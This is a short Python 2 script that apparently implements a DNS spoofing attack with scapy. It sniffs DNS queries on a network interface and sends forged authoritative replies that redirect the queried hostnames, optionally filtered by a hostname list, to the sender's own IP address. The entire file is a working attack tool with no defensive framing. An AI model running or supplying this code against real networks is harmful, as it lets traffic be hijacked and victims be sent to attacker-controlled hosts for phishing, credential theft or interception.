from scapy.all import *
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import socket
import netifaces

#31.13.71.36 staggering beauty

def interface_exists(interface):
	try:
		addr = netifaces.ifaddresses(interface)
	except:
		return False
	return netifaces.AF_INET in addr

def get_local_IP():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	local_IP = s.getsockname()[0]
	s.close()
	return local_IP

def arg_parser():
	parser = argparse.ArgumentParser(add_help=False)
	parser.add_argument("-i", default="eth0", help ="interface")
	parser.add_argument("-h", help="file containing hostnames")
	parser.add_argument("expression", type=str, help="expression filter", default="", nargs="?")
	return parser.parse_args()

def callback(pkt):
	if not pkt.haslayer(DNSQR):
		return

	#packet is what we want
	redirect_IP = get_local_IP()
	if hostname is not None:
		lines = [line.rstrip('\n') for line in open(hostname)]
		target_IP = [line.split(" ")[0] for line in lines if pkt[DNSQR].qname[:-1] in line]
		if len(target_IP) == 0:
			return
	if redirect_IP is None or len(redirect_IP) == 0:
		return
	else:
		print 
		print "\n... Will be redirected to %s" % redirect_IP
	print "... Making spoofed packet"
	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
					UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
					DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
						an=DNSRR(rrname=pkt[DNS].qd.name, ttl=10, rdata=redirect_IP))
	send(spoofed_pkt)
	print "[+] Sent spoofed packet for %s" % pkt[DNSQR].qname[:-1]
	print spoofed_pkt.summary()

if __name__ == '__main__':
	args = arg_parser()
	interface = args.i
	hostname = args.h
	space = " "
	dst_port_filter = "dst port 53" #use for both udp and tcp
	expression = args.expression
	bpf_filter = expression + space + dst_port_filter
	print interface
	print hostname
	print expression
	try:
		if interface and interface_exists(interface):
			sniff(filter=bpf_filter, prn=callback, store=0, iface=interface)
		elif interface is None:
			sniff(filter=bpf_filter, prn=callback, store=0)
		else:
			print "Expected: valid interface that is UP. Found: interface device not found: %s" % interface
	except OSError as err:
		print "Error: {0}".format(err)
